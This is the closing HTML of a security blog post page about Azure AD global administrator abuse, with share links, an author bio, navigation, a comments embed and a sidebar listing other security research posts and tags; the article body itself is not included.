	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2fadmin%2f&text=Keys%20of%20the%20kingdom%3a%20Playing%20God%20as%20Global%20Admin&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2fadmin%2f&mini=true&title=Keys%20of%20the%20kingdom%3a%20Playing%20God%20as%20Global%20Admin&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
</ul>
</div>
	</article>
	
<div class="authorbox clearfix">
	<figure class="authorbox__avatar">
		<img alt="Dr Nestori Syynimaa (@DrAzureAD) avatar" src="/images/nestori.jpg" class="avatar" height="90" width="90">
	</figure>
	<div class="authorbox__header">
		<span class="authorbox__name">About Dr Nestori Syynimaa (@DrAzureAD)</span>
	</div>
	<div class="authorbox__description">
		Dr Syynimaa works as Senior Principal Information Security Researcher at Secureworks CTU (Counter Threat Unit). <br> Before moving to his current position, Dr Syynimaa worked as a CIO, consultant, trainer, and university lecturer for over 20 years. He is a regular speaker in scientific and professional conferences related to Microsoft 365 and Azure AD security. <br><br>Dr Syynimaa is Microsoft Certified Expert (Microsoft 365), Microsoft Certified Azure Solutions Architect Expert, Microsoft Certified Trainer, Microsoft MVP (Enterprise Mobility, Identity and Access &amp; Intune), and Microsoft Most Valuable Security Researcher (MVR).
	</div>
</div>
	
<nav class="post-nav row clearfix" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
	<div class="post-nav__item post-nav__item--prev col-1-2">
		<a class="post-nav__link" href="/post/insider/" rel="prev"><span class="post-nav__caption">«Previous</span><p class="post-nav__post-title">Wolf in sheep&#39;s clothing: Azure Active Directory reconnaissance as an insider</p></a>
	</div>
	<div class="post-nav__item post-nav__item--next col-1-2">
		<a class="post-nav__link" href="/post/on-prem_admin/" rel="next"><span class="post-nav__caption">Next»</span><p class="post-nav__post-title">Unnoticed sidekick: Getting access to cloud as an on-prem admin</p></a>
	</div>
</nav>

	
<div class="comments">
	<div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "o365blog-com" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

</main>

<aside class="sidebar" itemscope="itemscope" itemtype="http://schema.org/WPSideBar">
	
<div class="widget-search widget">
	<form class="widget-search__form" role="search" method="get" action="//google.com/search">
		<label>
			<span class="screen-reader-text">Search for:</span>
			<input class="widget-search__field" type="search" placeholder="SEARCH..." value="" name="q">
		</label>
		<input class="widget-search__submit" type="submit" value="Search">
		<input type="hidden" name="sitesearch" value="http://o365blog.com" />
	</form>
</div>
	
<div class="widget-recent widget">
	<h4 class="widget__title">Recent Posts</h4>
	<div class="widget__content">
		<ul class="widget__list">
			<li class="widget__item"><a class="widget__link" href="/post/pta/">Exploiting Azure AD PTA vulnerabilities: Creating backdoor and harvesting credentials</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/gmsa/">Hunt for the gMSA secrets</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/august_2022/">AADInternals World Tour August 2022: USA</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/deviceidentity/">Stealing and faking Azure AD device identities</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/partners/">Microsoft partners: The Good, The Bad, or The Ugly?</a></li>
		</ul>
	</div>
</div>

	
<div class="widget-categories widget">
	<h4 class="widget__title">Categories</h4>
	<div class="widget__content">
		<ul class="widget__list">
			<li class="widget__item"><a class="widget__link" href="/categories/"></a></li>
			<li class="widget__item"><a class="widget__link" href="/categories/article">Article</a></li>
			<li class="widget__item"><a class="widget__link" href="/categories/blog">Blog</a></li>
		</ul>
	</div>
</div>
	
<div class="widget-social widget">
	<h4 class="widget-social__title widget__title">Social</h4>
	<div class="widget-social__content widget__content">
		<div class="widget-social__item widget__item">
			<a class="widget-social__link widget__link btn" title="Twitter" rel="noopener noreferrer" href="https://twitter.com/DrAzureAD" target="_blank">
				<svg class="widget-social__link-icon icon-twitter" viewBox="0 0 384 312" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m384 36.9c-14.1 6.3-29.3 10.5-45.2 12.4 16.3-9.7 28.8-25.2 34.6-43.6-15.2 9-32.1 15.6-50 19.1-14.4-15.2-34.9-24.8-57.5-24.8-43.5 0-78.8 35.3-78.8 78.8 0 6.2.7 12.2 2 17.9-65.5-3.3-123.5-34.6-162.4-82.3-6.7 11.6-10.6 25.2-10.6 39.6 0 27.3 13.9 51.4 35 65.6-12.9-.4-25.1-4-35.7-9.9v1c0 38.2 27.2 70 63.2 77.2-6.6 1.8-13.6 2.8-20.8 2.8-5.1 0-10-.5-14.8-1.4 10 31.3 39.1 54.1 73.6 54.7-27 21.1-60.9 33.7-97.8 33.7-6.4 0-12.6-.4-18.8-1.1 34.9 22.4 76.3 35.4 120.8 35.4 144.9 0 224.1-120 224.1-224.1 0-3.4-.1-6.8-.2-10.2 15.4-11.1 28.7-25 39.3-40.8z"/></svg>
				<span>Twitter</span>
			</a>
		</div>
		<div class="widget-social__item widget__item">
			<a class="widget-social__link widget__link btn" title="" rel="noopener noreferrer" href="https://linkedin.com/in/nestori" target="_blank">
				<svg class="widget-social__link-icon icon-linkedin" viewBox="0 0 352 352" width="24" height="24" fill="#fff" xmlns="http://www.w3.org/2000/svg"><path d="M0,40v272c0,21.9,18.1,40,40,40h272c21.9,0,40-18.1,40-40V40c0-21.9-18.1-40-40-40H40C18.1,0,0,18.1,0,40z M312,32 c4.6,0,8,3.4,8,8v272c0,4.6-3.4,8-8,8H40c-4.6,0-8-3.4-8-8V40c0-4.6,3.4-8,8-8H312z M59.5,87c0,15.2,12.3,27.5,27.5,27.5 c15.2,0,27.5-12.3,27.5-27.5c0-15.2-12.3-27.5-27.5-27.5C71.8,59.5,59.5,71.8,59.5,87z M187,157h-1v-21h-45v152h47v-75 c0-19.8,3.9-39,28.5-39c24.2,0,24.5,22.4,24.5,40v74h47v-83.5c0-40.9-8.7-72-56.5-72C208.5,132.5,193.3,145.1,187,157z M64,288h47.5 V136H64V288z"/></svg>
				<span>LinkedIn</span>
			</a>
		</div>
		<div class="widget-social__item widget__item">
			<a class="widget-social__link widget__link btn" title="Email" href="mailto:nestori.syynimaa@gerenios.com">
				<svg class="widget-social__link-icon icon-mail" viewBox="0 0 416 288" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m0 16v256 16h16 384 16v-16-256-16h-16-384-16zm347 16-139 92.5-139-92.5zm-148 125.5 9 5.5 9-5.5 167-111.5v210h-352v-210z"/></svg>
				<span>nestori.syynimaa@gerenios.com</span>
			</a>
		</div>
	</div>
</div>

	
<div class="widget-taglist widget">
	<h4 class="widget__title">Tags</h4>
	<div class="widget__content">
		<a class="widget__link widget__link--taglist" href="/tags/aadconnect" title="aadconnect">aadconnect (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/aadinternals" title="aadinternals">aadinternals (10)</a>
		<a class="widget__link widget__link--taglist" href="/tags/abusing" title="abusing">abusing (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/active-directory" title="active-directory">active-directory (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/adfs" title="adfs">adfs (5)</a>
		<a class="widget__link widget__link--taglist" href="/tags/admin" title="admin">admin (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/administration" title="administration">administration (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/authentication" title="authentication">authentication (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/azure" title="azure">azure (20)</a>
		<a class="widget__link widget__link--taglist" href="/tags/azure-active-directory" title="azure-active-directory">azure-active-directory (27)</a>
		<a class="widget__link widget__link--taglist" href="/tags/azuread" title="azuread">azuread (4)</a>
		<a class="widget__link widget__link--taglist" href="/tags/backdoor" title="backdoor">backdoor (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/blackhat" title="blackhat">blackhat (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/blue-team" title="blue-team">blue-team (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/bprt" title="bprt">bprt (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/browser" title="browser">browser (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/compromise" title="compromise">compromise (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/conferences" title="conferences">conferences (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/defcon" title="defcon">defcon (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/desktop-sso" title="desktop-sso">desktop-sso (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/device" title="device">device (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/dns" title="dns">dns (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/email" title="email">email (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/encryption" title="encryption">encryption (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/exchange" title="exchange">exchange (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/federation" title="federation">federation (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/forensics" title="forensics">forensics (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/gdpr" title="gdpr">gdpr (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/global-administrator" title="global-administrator">global-administrator (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/graph" title="graph">graph (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/groups" title="groups">groups (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/guest" title="guest">guest (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/hybrid-join" title="hybrid-join">hybrid-join (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/identity" title="identity">identity (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/inactive" title="inactive">inactive (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/insider" title="insider">insider (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/intune" title="intune">intune (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/join" title="join">join (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/logs" title="logs">logs (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/mailbox" title="mailbox">mailbox (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/mdm" title="mdm">mdm (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/mfa" title="mfa">mfa (6)</a>
		<a class="widget__link widget__link--taglist" href="/tags/office-365" title="office-365">office-365 (9)</a>
		<a class="widget__link widget__link--taglist" href="/tags/office365" title="office365">office365 (9)</a>
		<a class="widget__link widget__link--taglist" href="/tags/on-prem" title="on-prem">on-prem (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/onedrive" title="onedrive">onedrive (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/outsider" title="outsider">outsider (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/partner" title="partner">partner (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/password" title="password">password (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/persistence" title="persistence">persistence (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/phishing" title="phishing">phishing (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/planner" title="planner">planner (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/powershell" title="powershell">powershell (13)</a>
		<a class="widget__link widget__link--taglist" href="/tags/prt" title="prt">prt (6)</a>
		<a class="widget__link widget__link--taglist" href="/tags/pta" title="pta">pta (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/recon" title="recon">recon (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/reconnaissance" title="reconnaissance">reconnaissance (4)</a>
		<a class="widget__link widget__link--taglist" href="/tags/seamless-sso" title="seamless-sso">seamless-sso (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/security" title="security">security (31)</a>
		<a class="widget__link widget__link--taglist" href="/tags/sso" title="sso">sso (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/sync" title="sync">sync (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/synchronisation" title="synchronisation">synchronisation (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/t2" title="t2">t2 (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/talks" title="talks">talks (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/teams" title="teams">teams (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/user" title="user">user (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/virtual-machine" title="virtual-machine">virtual-machine (1)</a>
	</div>
</div>
</aside>

	</div>
		<footer class="footer" itemscope="itemscope" itemtype="http://schema.org/WPFooter">
			<div class="container container-inner">
				<p class="footer__copyright"><span><a href="https://creativecommons.org/licenses/by/4.0/" target="_blank"><img src="/images/CC-BY.png"></a> </span></p>
			</div>
		</footer>
	</div>

<script>
	var navigation = responsiveNav(".menu", {
		navClass: "menu--collapse",
	});
</script>
</body>
</html>
